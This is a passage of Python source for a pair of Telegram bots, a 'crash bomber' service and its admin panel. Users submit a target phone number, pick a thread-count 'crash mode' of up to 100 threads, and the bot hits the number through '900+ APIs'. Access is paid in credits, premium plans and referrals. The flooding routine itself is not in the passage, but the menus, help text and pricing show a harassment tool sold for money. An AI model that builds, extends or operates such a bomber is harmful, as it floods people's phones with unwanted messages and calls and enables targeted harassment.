        row.append(types.InlineKeyboardButton(btn_label, callback_data=f"crash_{speed[:-1]}_{phone}"))
        
        if len(row) == 2:
            kb.row(*row)
            row = []
    
    if row:
        kb.row(*row)
    
    bot.reply_to(m, f"""
💣 <b>SELECT CRASH MODE</b>

📱 Target: <code>{phone}</code>
💰 Credits: <b>{credits}</b>

🟢 <b>Unlocked:</b> {', '.join(unlocked)}

⚡ <b>Crash Modes:</b>
1x = 5 threads
2x = 10 threads  
3x = 15 threads
5x = 25 threads
10x = 50 threads (INSANE!)
20x = 100 threads (NUCLEAR!) 💀

Choose below:
""", reply_markup=kb)

@bot.message_handler(func=lambda m: m.text == "💰 My Credits")
def credits_cmd(m):
    if is_blocked(m.from_user.id):
        return
    uid = str(m.from_user.id)
    credits = users.get(uid, {}).get("credits", 0)
    premium_status = "✅ Active" if is_premium(m.from_user.id) else "❌ Not Active"
    unlocked = get_unlocked_speeds(m.from_user.id)
    
    bot.reply_to(m, f"""
💰 <b>Credits: {credits}</b>
👑 Premium: {premium_status}

⚡ <b>Unlocked Modes:</b>
{', '.join(unlocked)}
""")

@bot.message_handler(func=lambda m: m.text == "📊 Stats")
def stats_cmd(m):
    if is_blocked(m.from_user.id):
        return
    uid = str(m.from_user.id)
    user_data = users.get(uid, {})
    
    bot.reply_to(m, f"""
📊 <b>Statistics</b>

💰 Credits: <b>{user_data.get('credits', 0)}</b>
👑 Premium: <b>{'Yes' if is_premium(m.from_user.id) else 'No'}</b>
📅 Joined: <b>{user_data.get('joined', 'Unknown')[:10]}</b>

🚀 Active APIs: {len(ULTIMATE_APIS)}
👥 Total Users: {len(users)}
""")

@bot.message_handler(func=lambda m: m.text == "🔗 Refer")
def refer_cmd(m):
    if is_blocked(m.from_user.id):
        return
    uid = str(m.from_user.id)
    bot_username = bot.get_me().username
    ref_link = f"https://t.me/{bot_username}?start=ref_{uid}"
    bot.reply_to(m, f"🔗 <b>Refer & Earn!</b>\n\nLink:\n<code>{ref_link}</code>\n\n💰 Earn {REF_CREDITS} credit per referral!")

@bot.message_handler(func=lambda m: m.text == "💳 Buy Credits & Premium")
def buy_cmd(m):
    if is_blocked(m.from_user.id):
        return
    
    prices = settings.get("credit_prices", CREDIT_PRICES)
    premium = settings.get("premium_price", PREMIUM_PRICE)
    owner = settings.get("owner_username", OWNER_USERNAME)
    
    msg = "💳 <b>BUY CREDITS & PREMIUM</b>\n\n"
    msg += "💰 <b>CREDITS:</b>\n"
    for price_data in prices.values():
        msg += f"• {price_data['label']}\n"
    
    msg += f"\n👑 <b>PREMIUM:</b>\n"
    msg += f"• {premium['label']}\n\n"
    msg += f"<b>Benefits:</b>\n"
    msg += f"✅ ALL Crash Modes Unlocked\n"
    msg += f"✅ Daily {premium['daily_credits']} Credits\n"
    msg += f"✅ Up to 100 threads!\n\n"
    msg += f"📞 {owner}"
    
    bot.reply_to(m, msg)

@bot.message_handler(func=lambda m: m.text == "❓ Help")
def help_cmd(m):
    bot.reply_to(m, f"""
📘 <b>CRASH BOMBER GUIDE</b>

<b>How to Use:</b>
1️⃣ Send phone number
2️⃣ Select crash mode
3️⃣ Bot uses multiple threads
4️⃣ Target gets CRASHED!

<b>Modes:</b>
• 1x = 5 threads
• 5x = 25 threads  
• 10x = 50 threads
• 20x = 100 threads! 💀

<b>Features:</b>
• Real multi-threading
• 900+ APIs
• Live stats
• Premium unlocks all

<b>Earn Credits:</b>
• Refer: {REF_CREDITS}/referral
• Gift codes
• Buy packages
""")

@bot.message_handler(func=lambda m: m.text == "📞 Owner")
def owner_cmd(m):
    owner = settings.get("owner_username", OWNER_USERNAME)
    bot.reply_to(m, f"📞 <b>Owner</b>\n\n👤 {owner}\n\n💼 For credits & premium")


# ==================== ADMIN PANEL ====================
@admin_bot.message_handler(commands=["start"])
def admin_start(m):
    if not is_admin(m.from_user.id):
        admin_bot.reply_to(m, "❌ Unauthorized!")
        return
    
    status = "🟢 Active" if settings.get("bot_active", True) else "🔴 OFF"
    
    admin_bot.reply_to(m, f"""
🔐 <b>ADMIN - HARDCORE CRASH BOMBER</b>

Status: {status}

<b>Bot Control:</b>
/on /off /stats

<b>User Management:</b>
/add uid credits
/set uid credits
/check uid
/block uid /unblock uid
/addpremium uid days

<b>Speed Unlock:</b>
/unlock uid 5x
/unlockall uid
/checkspeed uid

<b>Gift Codes:</b>
/createcode credits uses [days]
/listcodes

<b>Broadcast:</b>
/broadcast message
""")

@admin_bot.message_handler(commands=["on"])
def admin_on(m):
    if not is_admin(m.from_user.id):
        return
    settings["bot_active"] = True
    save_json(SETTINGS_FILE, settings)
    admin_bot.reply_to(m, "✅ Bot ON!")

@admin_bot.message_handler(commands=["off"])
def admin_off(m):
    if not is_admin(m.from_user.id):
        return
    settings["bot_active"] = False
    save_json(SETTINGS_FILE, settings)
    admin_bot.reply_to(m, "🔴 Bot OFF!")

@admin_bot.message_handler(commands=["stats"])
def admin_stats(m):
    if not is_admin(m.from_user.id):
        return
    
    total_users = len(users)
    premium_users = sum(1 for uid in users if is_premium(int(uid)))
    total_credits = sum(u.get("credits", 0) for u in users.values())
    
    admin_bot.reply_to(m, f"""
📊 <b>Bot Statistics</b>

👥 Users: {total_users}
👑 Premium: {premium_users}
💰 Credits: {total_credits}
🚀 APIs: {len(ULTIMATE_APIS)}
🚫 Blocked: {len(blocked)}
""")

@admin_bot.message_handler(commands=["unlock"])
def admin_unlock(m):
    if not is_admin(m.from_user.id):
        return
    try:
        parts = m.text.split()
        if len(parts) != 3:
            admin_bot.reply_to(m, "❌ Usage: /unlock uid 5x")
            return
        
        uid = str(parts[1])
        speed = parts[2]
        
        if speed not in SPEED_CONFIGS:
            admin_bot.reply_to(m, f"❌ Invalid! Use: {', '.join(SPEED_CONFIGS.keys())}")
            return
        
        if uid not in users:
            users[uid] = {"credits": 0, "joined": str(datetime.now()), "unlocked_speeds": ["1x", "2x", "3x"]}
        
        unlocked = users[uid].get("unlocked_speeds", ["1x", "2x", "3x"])
        
        if speed in unlocked:
            admin_bot.reply_to(m, f"⚠️ Already unlocked!")
            return
        
        unlocked.append(speed)
        users[uid]["unlocked_speeds"] = unlocked
        save_json(USERS_FILE, users)
        
        admin_bot.reply_to(m, f"✅ Unlocked {speed} for {uid}!")
        
        try:
            bot.send_message(int(uid), f"🎉 <b>{speed} UNLOCKED!</b>\n\nYou now have access to {SPEED_CONFIGS[speed]['threads']} threads mode!")
        except:
            pass
    except Exception as e:
        admin_bot.reply_to(m, f"❌ Error: {e}")

@admin_bot.message_handler(commands=["unlockall"])
def admin_unlock_all(m):
    if not is_admin(m.from_user.id):
        return
    try:
        uid = str(m.text.split()[1])
        
        if uid not in users:
            users[uid] = {"credits": 0, "joined": str(datetime.now())}
        
        users[uid]["unlocked_speeds"] = list(SPEED_CONFIGS.keys())
        save_json(USERS_FILE, users)
        
        admin_bot.reply_to(m, f"✅ All modes unlocked for {uid}!")
        
        try:
            bot.send_message(int(uid), "🎉 <b>ALL CRASH MODES UNLOCKED!</b>\n\n💀 You now have access to NUCLEAR mode (100 threads)!")
        except:
            pass
    except:
        admin_bot.reply_to(m, "❌ Usage: /unlockall uid")

@admin_bot.message_handler(commands=["checkspeed"])
def admin_check_speed(m):
    if not is_admin(m.from_user.id):
        return
    try:
        uid = str(m.text.split()[1])
        
        if uid not in users:
            admin_bot.reply_to(m, "❌ User not found!")
            return
        
        unlocked = users[uid].get("unlocked_speeds", ["1x", "2x", "3x"])
        locked = [s for s in SPEED_CONFIGS.keys() if s not in unlocked]
        
        admin_bot.reply_to(m, f"""
⚡ <b>Speed Status - {uid}</b>

🟢 Unlocked: {', '.join(unlocked)}
🔒 Locked: {', '.join(locked) if locked else 'None'}
👑 Premium: {'Yes' if is_premium(int(uid)) else 'No'}
""")
    except:
        admin_bot.reply_to(m, "❌ Usage: /checkspeed uid")

@admin_bot.message_handler(commands=["add"])
def admin_add(m):
    if not is_admin(m.from_user.id):
        return
    try:
        _, uid, amount = m.text.split()
        uid, amount = str(uid), int(amount)
        if uid not in users:
            users[uid] = {"credits": 0, "joined": str(datetime.now()), "unlocked_speeds": ["1x", "2x", "3x"]}
        users[uid]["credits"] = users[uid].get("credits", 0) + amount
        save_json(USERS_FILE, users)
        admin_bot.reply_to(m, f"✅ Added {amount} credits to {uid}")
        try:
            bot.send_message(int(uid), f"🎁 +{amount} credits!")
        except:
            pass
    except:
        admin_bot.reply_to(m, "❌ Usage: /add uid amount")

@admin_bot.message_handler(commands=["set"])
def admin_set(m):
    if not is_admin(m.from_user.id):
        return
    try:
        _, uid, amount = m.text.split()
        uid, amount = str(uid), int(amount)
        if uid not in users:
            users[uid] = {"joined": str(datetime.now()), "unlocked_speeds": ["1x", "2x", "3x"]}
        users[uid]["credits"] = amount
        save_json(USERS_FILE, users)
        admin_bot.reply_to(m, f"✅ Set {uid} credits to {amount}")
    except:
        admin_bot.reply_to(m, "❌ Usage: /set uid amount")

@admin_bot.message_handler(commands=["check"])
def admin_check(m):
    if not is_admin(m.from_user.id):
        return
    try:
        uid = m.text.split()[1]
        if uid not in users:
            admin_bot.reply_to(m, "❌ Not found!")
            return
        data = users[uid]
        premium = "Yes" if is_premium(int(uid)) else "No"
        unlocked = data.get("unlocked_speeds", ["1x", "2x", "3x"])
        
        admin_bot.reply_to(m, f"""
👤 <b>User {uid}</b>

💰 Credits: {data.get('credits', 0)}
👑 Premium: {premium}
⚡ Unlocked: {', '.join(unlocked)}
📅 Joined: {data.get('joined', 'Unknown')[:10]}
""")
    except:
        admin_bot.reply_to(m, "❌ Usage: /check uid")

@admin_bot.message_handler(commands=["block"])
def admin_block(m):
    if not is_admin(m.from_user.id):
        return
    try:
        uid = int(m.text.split()[1])
        if uid not in blocked:
            blocked.append(uid)
            save_json(BLOCKED_FILE, blocked)
            admin_bot.reply_to(m, f"✅ Blocked {uid}")
        else:
            admin_bot.reply_to(m, "Already blocked!")
    except:
        admin_bot.reply_to(m, "❌ Usage: /block uid")

@admin_bot.message_handler(commands=["unblock"])
def admin_unblock(m):
    if not is_admin(m.from_user.id):
        return
    try:
        uid = int(m.text.split()[1])
        if uid in blocked:
            blocked.remove(uid)
            save_json(BLOCKED_FILE, blocked)
            admin_bot.reply_to(m, f"✅ Unblocked {uid}")
        else:
            admin_bot.reply_to(m, "Not blocked!")
    except:
        admin_bot.reply_to(m, "❌ Usage: /unblock uid")

@admin_bot.message_handler(commands=["addpremium"])
def admin_addpremium(m):
    if not is_admin(m.from_user.id):
        return
    try:
        _, uid, days = m.text.split()
        uid, days = str(uid), int(days)
        
        if uid not in users:
            users[uid] = {"credits": 0, "joined": str(datetime.now()), "unlocked_speeds": ["1x", "2x", "3x"]}
        
        expiry = datetime.now() + timedelta(days=days)
        users[uid]["premium_until"] = expiry.isoformat()
        users[uid]["unlocked_speeds"] = list(SPEED_CONFIGS.keys())
        save_json(USERS_FILE, users)
        
        admin_bot.reply_to(m, f"✅ Premium {days}d → {uid}")
        try:
            bot.send_message(int(uid), f"👑 <b>PREMIUM ACTIVATED!</b>\n\n⏰ {days} days\n⚡ All modes unlocked!\n💰 Daily {PREMIUM_PRICE['daily_credits']} credits")
        except:
            pass
    except:
        admin_bot.reply_to(m, "❌ Usage: /addpremium uid days")

@admin_bot.message_handler(commands=["createcode"])
def admin_createcode(m):
    if not is_admin(m.from_user.id):
        return
    try:
        parts = m.text.split()
        if len(parts) < 3:
            admin_bot.reply_to(m, "❌ Usage: /createcode credits uses [days]")
            return
        
        credits = int(parts[1])
        uses = int(parts[2])
        expires = int(parts[3]) if len(parts) == 4 else None
        
        code = create_gift_code(credits, uses, expires)
        
        admin_bot.reply_to(m, f"""
✅ <b>Code Created!</b>

🎁 <code>{code}</code>
💰 {credits} credits
🔢 {uses} uses
⏰ {expires}d expire
""")
    except Exception as e:
        admin_bot.reply_to(m, f"❌ Error: {e}")

@admin_bot.message_handler(commands=["listcodes"])
def admin_listcodes(m):
    if not is_admin(m.from_user.id):
        return
    
    if not giftcodes:
        admin_bot.reply_to(m, "📭 No codes!")
        return
    
    msg = "🎁 <b>Gift Codes:</b>\n\n"
    for code, data in giftcodes.items():
        used = len(data["used_by"])
        max_uses = data["max_uses"]
        msg += f"<code>{code}</code> - {data['credits']}💰 ({used}/{max_uses})\n"
    
    admin_bot.reply_to(m, msg)

@admin_bot.message_handler(commands=["broadcast"])
def admin_broadcast(m):
    if not is_admin(m.from_user.id):
        return
    try:
        msg = m.text.replace("/broadcast ", "", 1)
        if not msg:
            admin_bot.reply_to(m, "❌ Usage: /broadcast message")
            return
        
        success = 0
        fail = 0
        for uid in users:
            try:
                bot.send_message(int(uid), f"📢 <b>ANNOUNCEMENT</b>\n\n{msg}")
                success += 1
                time.sleep(0.05)
            except:
                fail += 1
        
        admin_bot.reply_to(m, f"✅ Done!\n\n✅ {success}\n❌ {fail}")
    except Exception as e:
        admin_bot.reply_to(m, f"❌ Error: {e}")

# ==================== START BOTS ====================
def start_main_bot():
    while True:
        try:
            logger.info("🤖 Main bot starting...")
            bot.infinity_polling(timeout=60, long_polling_timeout=60)
        except Exception as e:
            logger.error(f"Main bot error: {e}")
            time.sleep(5)

def start_admin_bot():
    while True:
        try:
            logger.info("⚙️ Admin bot starting...")
            admin_bot.infinity_polling(timeout=60, long_polling_timeout=60)
        except Exception as e:
            logger.error(f"Admin bot error: {e}")
            time.sleep(5)

if __name__ == "__main__":
    logger.info("🚀 Starting HARDCORE CRASH BOMBER...")
    logger.info(f"✅ Main: @{bot.get_me().username}")
    logger.info(f"✅ Admin: @{admin_bot.get_me().username}")
    
    main_thread = threading.Thread(target=start_main_bot, daemon=True)
    admin_thread = threading.Thread(target=start_admin_bot, daemon=True)
    
    main_thread.start()
    admin_thread.start()
    
    logger.info("💣 HARDCORE CRASH SYSTEM ACTIVE!")
    
    try:
        while True:
            time.sleep(1)
    except KeyboardInterrupt:
        logger.info("⚠️ Stopping...")

